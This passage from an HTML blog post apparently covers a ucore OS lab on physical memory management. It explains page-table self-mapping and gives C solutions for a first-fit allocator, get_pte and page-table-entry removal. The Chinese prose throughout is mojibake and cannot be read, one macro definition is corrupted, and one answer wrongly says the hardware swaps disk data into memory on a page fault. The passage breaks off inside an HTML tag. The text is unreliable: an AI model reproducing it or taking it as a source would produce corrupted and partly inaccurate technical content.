tableä¹‹å(åœ¨default_init_memmapå®Œæˆ), è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯ä¸€ç‰‡è¿ç»­çš„ç©ºé—´, ä»0xC0000000å¼€å§‹, å¤§å°ä¸º0x38000000=896MB, å¹¶æ²¡æœ‰ç”¨å®Œå…¨éƒ¨4GBçš„åœ°å€ç©ºé—´, è¿™åªæ˜¯ä¸€ä¸ªè®¾å®š, å¯ä»¥æ ¹æ®æƒ…å†µè¿›è¡Œæ”¹å˜.<br>memlayout.hä¸­å®šä¹‰äº†å¸¸é‡</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE 0xC0000000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMEMSIZE 0x38000000 <span class="hljs-comment">// the maximum amount of physical memory</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNTOP (KERNBASE + KMEMSIZE)</span><br><span class="hljs-comment">//------------------------------</span><br>define VPT<span class="hljs-number">0xFAC00000</span><br></code></pre></div></td></tr></table></figure><p><strong>è‡ªæ˜ å°„æ˜¯ä»€ä¹ˆ?</strong> </p><p>æ³¨æ„åˆ°æ¯ä¸€ä¸ª4KBé¡µè¡¨ä¸­æœ‰1kä¸ª4Bçš„pte, æ¯ä¸ªpteæŒ‡å‘ç‰©ç†ç©ºé—´ä¸­4KBçš„page, æ•´ä¸ªpage tableæŒ‡å‘äº†è™šæ‹Ÿç©ºé—´ä¸­4MBå¤§å°çš„pages. å¦‚æœæˆ‘ä»¬æŠŠæ˜ å°„4GBç©ºé—´çš„4MBé¡µè¡¨æ”¾åœ¨4MBå¯¹é½çš„è™šæ‹Ÿåœ°å€å¤„, é‚£ä¹ˆå¯ä»¥æƒ³åˆ°æœ‰ä¸€ä¸ªé¡µè¡¨åˆšå¥½æ˜ å°„ä»–æ‰€åœ¨çš„4MBåŒºåŸŸ, äºæ˜¯å°±å……å½“äº†é¡µç›®å½•è¡¨çš„åŠŸèƒ½.</p><p>å…·ä½“è€Œè¨€ï¼Œucoreæ˜¯è¿™æ ·è®¾è®¡çš„ï¼Œé¦–å…ˆè®¾ç½®äº†ä¸€ä¸ªå¸¸é‡ï¼ˆmemlayout.hï¼‰ï¼š</p><p>VPT=<strong>0xFAC00000</strong>ï¼Œ è¿™ä¸ªåœ°å€çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">1111</span> <span class="hljs-number">1010</span> <span class="hljs-number">11</span>|<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>| <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span><span class="hljs-comment">//ç®¡é“ç¬¦å·è¡¨ç¤ºè™šæ‹Ÿåœ°å€çš„ä¸‰ä¸ªéƒ¨åˆ†</span><br></code></pre></div></td></tr></table></figure><p>é«˜10ä½ä¸º1111 1010 11ï¼Œå³10è¿›åˆ¶çš„1003ï¼Œä¸­é—´10ä½ä¸º0ï¼Œä½12ä½ä¹Ÿä¸º0ã€‚åœ¨pmm.cä¸­æœ‰ä¸¤ä¸ªå…¨å±€åˆå§‹åŒ–å˜é‡</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">pte_t</span> * <span class="hljs-keyword">const</span> vpt = (<span class="hljs-keyword">pte_t</span> *)VPT;<br><span class="hljs-keyword">pde_t</span> * <span class="hljs-keyword">const</span> vpd = (<span class="hljs-keyword">pde_t</span> *)PGADDR(PDX(VPT), PDX(VPT), <span class="hljs-number">0</span>);<span class="hljs-comment">//è¿™ä¸ªå®ç”¨æ¥æ‹¼æ¥è™šæ‹Ÿåœ°å€</span><br></code></pre></div></td></tr></table></figure><p>å¹¶åœ¨pmm_initå‡½æ•°æ‰§è¡Œäº†å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br></code></pre></div></td></tr></table></figure><p>è¿™äº›å˜é‡å’Œè¯­å¥æœ‰ä½•ç‰¹æ®Šå«ä¹‰å‘¢ï¼Ÿ<strong>å…¶å®vpdå˜é‡çš„å€¼å°±æ˜¯é¡µç›®å½•è¡¨çš„èµ·å§‹è™šåœ°å€0xFAFEB000</strong>ï¼Œä¸”å®ƒçš„é«˜10ä½å’Œä¸­10ä½æ˜¯ç›¸ç­‰çš„ï¼Œéƒ½æ˜¯10è¿›åˆ¶çš„1003ã€‚å½“æ‰§è¡Œäº†ä¸Šè¿°è¯­å¥ï¼Œå°±ç¡®ä¿äº†vpdå˜é‡çš„å€¼å°±æ˜¯é¡µç›®å½•è¡¨çš„èµ·å§‹è™šåœ°å€ï¼Œä¸”vptæ˜¯é¡µç›®å½•è¡¨ä¸­ç¬¬ä¸€ä¸ªç›®å½•è¡¨é¡¹æŒ‡å‘çš„é¡µè¡¨çš„èµ·å§‹è™šåœ°å€ã€‚æ­¤æ—¶æè¿°å†…æ ¸è™šæ‹Ÿç©ºé—´çš„é¡µç›®å½•è¡¨çš„è™šåœ°å€ä¸º0xFAFEB000ï¼Œå¤§å°ä¸º4KBã€‚é¡µè¡¨çš„ç†è®ºè¿ç»­è™šæ‹Ÿåœ°å€ç©ºé—´0xFAC00000~0xFB000000ï¼Œå¤§å°ä¸º4MBã€‚å› ä¸ºè¿™ä¸ªè¿ç»­åœ°å€ç©ºé—´çš„å¤§å°ä¸º4MBï¼Œå¯æœ‰1Mä¸ªPTEï¼Œå³å¯æ˜ å°„4GBçš„åœ°å€ç©ºé—´ã€‚</p><p><strong>æœ‰ä»€ä¹ˆå¥½å¤„?</strong> </p><p>åœ¨é¡µæœºåˆ¶å»ºç«‹å¥½å, å¦‚æœæˆ‘ä»¬è¿™æ—¶éœ€è¦æŒ‰è™šæ‹Ÿåœ°å€çš„åœ°å€é¡ºåºæ˜¾ç¤ºæ•´ä¸ªé¡µç›®å½•è¡¨å’Œé¡µè¡¨çš„å†…å®¹ï¼Œåˆ™è¦æŸ¥æ‰¾é¡µç›®å½•è¡¨çš„é¡µç›®å½•è¡¨é¡¹å†…å®¹ï¼Œæ ¹æ®é¡µç›®å½•è¡¨é¡¹å†…å®¹æ‰¾åˆ°é¡µè¡¨çš„ç‰©ç†åœ°å€**(pdtå’Œptä¸ºä»€ä¹ˆå­˜æ”¾çš„æ˜¯ç‰©ç†åœ°å€?)**ï¼Œå†è½¬æ¢æˆå¯¹åº”çš„è™šåœ°å€ï¼Œç„¶åè®¿é—®é¡µè¡¨çš„è™šåœ°å€ï¼Œæœç´¢æ•´ä¸ªé¡µè¡¨çš„æ¯ä¸ªé¡µç›®å½•é¡¹ã€‚è¿™æ ·è¿‡ç¨‹æ¯”è¾ƒç¹çã€‚</p><p>ä½†æ˜¯åˆ©ç”¨ä»¥ä¸Šçš„æ–¹æ³•, é€šè¿‡è¿ç»­æ‰«æè¿™ç‰¹å®šçš„4MBè™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå°±å¾ˆå®¹æ˜“è®¿é—®æ¯ä¸ªé¡µç›®å½•è¡¨é¡¹å’Œé¡µè¡¨é¡¹å†…å®¹ã€‚</p><p>åœ¨pmm.cä¸­çš„å‡½æ•°<code>print_pgdir</code>å°±æ˜¯åŸºäºucoreçš„é¡µè¡¨è‡ªæ˜ å°„æ–¹å¼å®Œæˆäº†å¯¹æ•´ä¸ªé¡µç›®å½•è¡¨å’Œé¡µè¡¨çš„å†…å®¹æ‰«æå’Œæ‰“å°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//print_pgdir - print the PDT&amp;PT</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">print_pgdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    cprintf(<span class="hljs-string">&quot;-------------------- BEGIN --------------------\n&quot;</span>);<br>    <span class="hljs-keyword">size_t</span> left, right = <span class="hljs-number">0</span>, perm;<br>    <span class="hljs-comment">//æ‰¾å‡ºä¸€ä¸ªé¡µç›®å½•è¡¨æƒé™ç›¸åŒçš„range, å­˜åœ¨leftå’Œrightä¸­</span><br>    <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(<span class="hljs-number">0</span>, NPDEENTRY, right, vpd, &amp;left, &amp;right)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//å‡ ä¸ªæ•°å­—åˆ†åˆ«ä»£è¡¨rangeä¸­æ¡ç›®æ•°é‡,è™šåœ°å€èŒƒå›´,å¤§å°,æƒé™</span><br>        cprintf(<span class="hljs-string">&quot;PDE(%03x) %08x-%08x %08x %s\n&quot;</span>, right - left,<br>                left * PTSIZE, right * PTSIZE, (right - left) * PTSIZE, perm2str(perm));<br>        <span class="hljs-keyword">size_t</span> l, r = left * NPTEENTRY;<br>        <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(left * NPTEENTRY, right * NPTEENTRY, r, vpt, &amp;l, &amp;r)) != <span class="hljs-number">0</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;  |-- PTE(%05x) %08x-%08x %08x %s\n&quot;</span>, r - l,<br>                    l * PGSIZE, r * PGSIZE, (r - l) * PGSIZE, perm2str(perm));<br>        &#125;<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;--------------------- END ---------------------\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="ç»ƒä¹ 3-2"><a href="#ç»ƒä¹ 3-2" class="headerlink" title="ç»ƒä¹ 3+2"></a>ç»ƒä¹ 3+2</h2><h3 id="ç»ƒä¹ ä¸€-1"><a href="#ç»ƒä¹ ä¸€-1" class="headerlink" title="ç»ƒä¹ ä¸€"></a>ç»ƒä¹ ä¸€</h3><blockquote><p>å®ç° first-fit è¿ç»­ç‰©ç†å†…å­˜åˆ†é…ç®—æ³•</p></blockquote><ul><li>ç®€å•çš„ä¿®æ”¹äº†å‡ ä¸ªå‡½æ•°, ç”šè‡³ä¸ç”¨å…¨éƒ½æ”¹, ä¸è¿‡freeå‡½æ•°æˆ‘è°ƒè¯•äº†å¥½ä¹…</li></ul><h4 id="default-init-memmap"><a href="#default-init-memmap" class="headerlink" title="default_init_memmap"></a>default_init_memmap</h4><ul><li><p>è¯¥å‡½æ•°å°†æ–°é¡µé¢æ’å…¥é“¾è¡¨æ—¶ï¼Œæ²¡æœ‰æŒ‰ç…§åœ°å€é¡ºåºæ’å…¥</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>æ•…éœ€è¦ä¿®æ”¹è¯¥è¡Œä»£ç ï¼Œä½¿å…¶æŒ‰åœ°å€é¡ºåºæ’å…¥è‡³åŒå‘é“¾è¡¨ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add_before(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-alloc-pages"><a href="#default-alloc-pages" class="headerlink" title="default_alloc_pages"></a>default_alloc_pages</h4><ul><li><p>åœ¨åŸå…ˆçš„ä»£ç ä¸­ï¼Œå½“è·å–åˆ°äº†ä¸€ä¸ªå¤§å°è¶³å¤Ÿå¤§çš„é¡µé¢åœ°å€æ—¶ï¼Œç¨‹åºä¼šå…ˆå°†è¯¥é¡µå¤´ä»é“¾è¡¨ä¸­æ–­å¼€ï¼Œåˆ‡å‰²ï¼Œå¹¶å°†å‰©ä½™ç©ºé—´æ”¾å›é“¾è¡¨ä¸­ã€‚ä½†å°†<em>å‰©ä½™ç©ºé—´æ”¾å›é“¾è¡¨</em>æ—¶ï¼Œå¹¶æ²¡æœ‰æŒ‰ç…§åœ°å€é¡ºåºæ’å…¥é“¾è¡¨ã€‚</p><blockquote><p>è¿ç»­ç©ºé—²é¡µé¢ä¸­çš„ç¬¬ä¸€ä¸ªé¡µç§°ä¸ºé¡µå¤´ï¼Œpage headerã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    list_del(&amp;(page-&gt;page_link));<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        <span class="hljs-comment">// æ³¨æ„è¿™ä¸€æ­¥</span><br>        list_add(&amp;free_list, &amp;(p-&gt;page_link));<br>    &#125;<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>ä»¥ä¸‹æ˜¯ä¿®æ”¹åçš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        SetPageProperty(p);<br>        <span class="hljs-comment">// æ³¨æ„è¿™ä¸€æ­¥add after</span><br>        list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));<br>    &#125;<br>    list_del(&amp;(page-&gt;page_link));<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-free-pages"><a href="#default-free-pages" class="headerlink" title="default_free_pages"></a>default_free_pages</h4><ul><li><p>è¯¥å‡½æ•°é»˜è®¤ä¼šåœ¨å‡½æ•°æœ«å°¾å¤„ï¼Œå°†å¾…é‡Šæ”¾çš„é¡µå¤´æ’å…¥è‡³é“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹è¿™éƒ¨åˆ†ä»£ç ï¼Œä½¿å…¶æŒ‰åœ°å€é¡ºåºæ’å…¥è‡³å¯¹åº”çš„é“¾è¡¨ç»“ç‚¹å¤„ã€‚</p><p>å¯ä»¥åœ¨å¾ªç¯ä¸­è®°å½•æ¯”è¿™ä¸ªpageåœ°å€å°çš„free_page, è€Œä¸”è¿˜è¦è®¾ç½®æ ‡è®°æ¥è¡¨æ˜æ˜¯å¦æœ‰è¿™ä¹ˆä¸€ä¸ªpage, å…·ä½“å‚è§æºç </p></li></ul><h3 id="ç»ƒä¹ äºŒ-1"><a href="#ç»ƒä¹ äºŒ-1" class="headerlink" title="ç»ƒä¹ äºŒ"></a>ç»ƒä¹ äºŒ</h3><blockquote><p><strong>å®ç°å¯»æ‰¾è™šæ‹Ÿåœ°å€å¯¹åº”çš„é¡µè¡¨é¡¹</strong>.</p></blockquote><blockquote><p>é€šè¿‡è®¾ç½®é¡µè¡¨å’Œå¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œå¯å»ºç«‹è™šæ‹Ÿå†…å­˜åœ°å€å’Œç‰©ç†å†…å­˜åœ°å€çš„å¯¹åº”å…³ç³»ã€‚</p><p>å…¶ä¸­çš„<code>get_pte</code>å‡½æ•°æ˜¯è®¾ç½®é¡µè¡¨é¡¹ç¯èŠ‚ä¸­çš„ä¸€ä¸ªé‡è¦æ­¥éª¤ã€‚æ­¤å‡½æ•°æ‰¾åˆ°ä¸€ä¸ªè™šåœ°å€å¯¹åº”çš„äºŒçº§é¡µè¡¨é¡¹çš„å†…æ ¸è™šåœ°å€ï¼Œå¦‚æœæ­¤äºŒçº§é¡µè¡¨é¡¹ä¸å­˜åœ¨ï¼Œåˆ™åˆ†é…ä¸€ä¸ªåŒ…å«æ­¤é¡¹çš„äºŒçº§é¡µè¡¨ã€‚</p></blockquote><p>ä»¥ä¸‹ä¸ºå®ç°çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">pte_t</span> * <span class="hljs-title">get_pte</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">uintptr_t</span> la, <span class="hljs-keyword">bool</span> create)</span> </span>&#123;<br>    <span class="hljs-comment">// è·å–ä¼ å…¥çš„çº¿æ€§åœ°å€ä¸­æ‰€å¯¹åº”çš„é¡µç›®å½•æ¡ç›®çš„ç‰©ç†åœ°å€</span><br>    <span class="hljs-keyword">pde_t</span> *pdep = PDX(la) + pgdir;<br>    <span class="hljs-comment">// å¦‚æœè¯¥æ¡ç›®ä¸å¯ç”¨(not present)</span><br>    <span class="hljs-keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>        <span class="hljs-comment">// å¦‚æœåˆ†é…é¡µé¢å¤±è´¥ï¼Œæˆ–è€…ä¸å…è®¸åˆ†é…ï¼Œåˆ™è¿”å›NULL</span><br>        <span class="hljs-keyword">if</span> (!create || (page = alloc_page()) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// è®¾ç½®è¯¥ç‰©ç†é¡µé¢çš„å¼•ç”¨æ¬¡æ•°ä¸º1</span><br>        set_page_ref(page, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// è·å–å½“å‰ç‰©ç†é¡µé¢æ‰€ç®¡ç†çš„ç‰©ç†åœ°å€</span><br>        <span class="hljs-keyword">uintptr_t</span> pa = page2pa(page);<br>        <span class="hljs-comment">// æ¸…ç©ºè¯¥ç‰©ç†é¡µé¢çš„æ•°æ®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨è™šæ‹Ÿåœ°å€</span><br>        <span class="hljs-built_in">memset</span>(KADDR(pa), <span class="hljs-number">0</span>, PGSIZE);<br>        <span class="hljs-comment">// å°†æ–°åˆ†é…çš„é¡µé¢è®¾ç½®ä¸ºå½“å‰ç¼ºå¤±çš„é¡µç›®å½•æ¡ç›®ä¸­</span><br>        <span class="hljs-comment">// ä¹‹åè¯¥é¡µé¢å°±æ˜¯å…¶ä¸­çš„ä¸€ä¸ªäºŒçº§é¡µé¢</span><br>        *pdep = pa | PTE_U | PTE_W | PTE_P;<br>    &#125;<br>    <span class="hljs-comment">// è¿”å›åœ¨pgdirä¸­å¯¹åº”äºlaçš„äºŒçº§é¡µè¡¨é¡¹, æ³¨æ„æ˜¯è™šæ‹Ÿåœ°å€, å› ä¸ºè¿”å›ä¸€ä¸ªç‰©ç†åœ°å€ä¹Ÿæ²¡å•¥ç”¨, cpuæ“ä½œä¸äº†</span><br>    <span class="hljs-keyword">pte_t</span> *ptep = (<span class="hljs-keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)) + PTX(la);<br>    <span class="hljs-keyword">return</span> ptep; <br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>è¯·æè¿°é¡µç›®å½•é¡¹ï¼ˆPag Director Entryï¼‰å’Œé¡µè¡¨ï¼ˆPage Table Entryï¼‰ä¸­æ¯ä¸ªç»„æˆéƒ¨åˆ†çš„å«ä¹‰å’Œä»¥åŠå¯¹ucoreè€Œè¨€çš„æ½œåœ¨ç”¨å¤„ã€‚</p><blockquote><p>è¯·æŸ¥çœ‹<a href="#vpt&pdt">è™šæ‹Ÿé¡µè¡¨ç»“æ„</a></p></blockquote></li><li><p>å¦‚æœucoreæ‰§è¡Œè¿‡ç¨‹ä¸­è®¿é—®å†…å­˜ï¼Œå‡ºç°äº†é¡µè®¿é—®å¼‚å¸¸ï¼Œè¯·é—®ç¡¬ä»¶è¦åšå“ªäº›äº‹æƒ…ï¼Ÿ</p><ul><li>å°†å¼•å‘é¡µè®¿é—®å¼‚å¸¸çš„åœ°å€å°†è¢«ä¿å­˜åœ¨cr2å¯„å­˜å™¨ä¸­</li><li>è®¾ç½®é”™è¯¯ä»£ç </li><li>å¼•å‘Page Faultï¼Œå°†å¤–å­˜çš„æ•°æ®æ¢åˆ°å†…å­˜ä¸­</li><li>è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œé€€å‡ºä¸­æ–­ï¼Œè¿”å›åˆ°ä¸­æ–­å‰çš„çŠ¶æ€</li></ul></li></ul><h3 id="ç»ƒä¹ ä¸‰-1"><a href="#ç»ƒä¹ ä¸‰-1" class="headerlink" title="ç»ƒä¹ ä¸‰"></a>ç»ƒä¹ ä¸‰</h3><blockquote><p>é‡Šæ”¾æŸè™šåœ°å€æ‰€åœ¨çš„é¡µå¹¶å–æ¶ˆå¯¹åº”äºŒçº§é¡µè¡¨é¡¹çš„æ˜ å°„</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) <span class="hljs-comment">//(1) check if this page table entry is present</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep); <span class="hljs-comment">//(2) find corresponding page to pte</span><br><br>    <span class="hljs-keyword">if</span> (page_ref_dec(page) == <span class="hljs-number">0</span>) <span class="hljs-comment">//(3) decrease page reference</span><br>    &#123;<br>        free_page(page); <span class="hljs-comment">//(4) and free this page when page reference reachs 0</span><br>    &#125;<br>    *ptep = <span class="hljs-number">0</span>;                 <span class="hljs-comment">//(5) clear second page table entry</span><br>    tlb_invalidate(pgdir, la); <span class="hljs-comment">//(6) flush tlb</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä¸¤ä¸ªé—®é¢˜:</p><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">æ•°æ®ç»“æ„Pageçš„å…¨å±€å˜é‡ï¼ˆå…¶å®æ˜¯ä¸€ä¸ªæ•°ç»„ï¼‰çš„æ¯ä¸€é¡¹ä¸é¡µè¡¨ä¸­çš„é¡µç›®å½•é¡¹å’Œé¡µè¡¨é¡¹æœ‰æ— å¯¹åº”å…³ç³»ï¼Ÿå¦‚æœæœ‰ï¼Œå…¶å¯¹åº”å…³ç³»æ˜¯å•¥ï¼Ÿ</p><p>CPUå¦‚æœè¦è®¿é—®å†…å­˜åœ°å€, é€å‡ºCPUçš„è‚¯å®šæ˜¯è™šæ‹Ÿåœ°å€, ç»è¿‡MMUçš„è½¬æ¢å®Œæˆè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢.</p><p>åœ¨MMUä¸­, å–å‡ºè™šæ‹Ÿåœ°å€é«˜10ä½å’Œ%cr3æ‹¼æ¥æˆé¡µç›®å½•è¡¨æ¡ç›®(pdte), è¯»å–å‡ºå†…å­˜ä¸­çš„é¡µç›®å½•è¡¨(æˆ–è€…åœ¨MMUä¸­çš„TLB)æ‰€å­˜å‚¨çš„é¡µè¡¨ç‰©ç†åœ°å€, ç„¶åå‘é€è¿™ä¸ªç‰©ç†åœ°å€+è™šæ‹Ÿåœ°å€ä¸­é—´åä½åˆ°å†…å­˜ä¸­è®¿é—®åˆ°é¡µè¡¨æ¡ç›®, è¯»å‡ºæ‰€åœ¨pageçš„ç‰©ç†åœ°å€, ç„¶åå†å’Œè™šæ‹Ÿåœ°å€ä½12ä½æ‹¼æ¥æˆç‰©ç†åœ°å€åˆ°å†…å­˜ä¸­è®¿é—®. </p><p>å¦‚æœæ²¡æœ‰TLB, è¿™ä¸­é—´ä¼šæœ‰å¤šæ¬¡è®¿å­˜:</p><ol><li>ä¸ºè¯»å–ç›®å½•é¡¹è€Œè®¿é—®ä¸»å­˜ã€‚</li><li>ä¸ºè¯»å–é¡µè¡¨é¡¹è€Œè®¿é—®ä¸»å­˜ã€‚</li><li>ä¸ºè¯»å–æ“ä½œæ•°æˆ–æŒ‡ä»¤è€Œè®¿é—®ä¸»å­˜ã€‚</li></ol><p>å›ç­”æœ¬æ–‡ç« ä¸­çš„ä¸€ä¸ªé—®é¢˜: <strong>ä¸ºä»€ä¹ˆé¡µç›®å½•è¡¨å’Œé¡µè¡¨å­˜å‚¨çš„æ˜¯å¯¹åº”çš„ç‰©ç†åœ°å€è€Œä¸æ˜¯è™šæ‹Ÿåœ°å€?</strong> </p><p>åŸå› ä¹Ÿæ˜äº†äº†, è¿™ä¸¤ä¸ªè¡¨å°±æ˜¯MMUå’Œå†…å­˜åˆä½œå®Œæˆè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢çš„åŸºç¡€, è€Œè™šæ‹Ÿåœ°å€æ˜¯åœ¨å†…æ ¸ä¸­ä½¿ç”¨çš„ä¸€ä¸ªæŠ½è±¡è¿ç»­ç©ºé—´çš„åœ°å€, å’ŒMMUå…³ç³»ä¸å¤§, æ›´ä¸å¿…å¾€è¡¨é¡¹é‡Œå­˜å‚¨è™šæ‹Ÿåœ°å€, ä½•å†µè¿™ä¹ˆåšè¿˜ä¼šå¯¼è‡´é€’å½’æŸ¥æ‰¾<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="å³åŸå…ˆæŸ¥æ‰¾é¡µç›®å½•è¡¨çš„ç›®çš„æ˜¯æƒ³å°†æŸä¸ªçº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œä½†å¦‚æœé¡µç›®å½•è¡¨ä¸­å­˜æ”¾çš„æ˜¯äºŒçº§é¡µè¡¨çš„çº¿æ€§åœ°å€ï¼Œåˆ™éœ€è¦å…ˆæŸ¥æ‰¾è¯¥äºŒçº§é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œæ­¤æ—¶éœ€è¦é€’å½’æŸ¥æ‰¾ï¼Œè¿™å¯èƒ½ä¼šå‡ºç°æ°¸è¿œä¹ŸæŸ¥æ‰¾ä¸åˆ°ç‰©ç†åœ°å€çš„æƒ…å†µã€‚">[1]</span></a></sup> </p><p class="note note-primary" 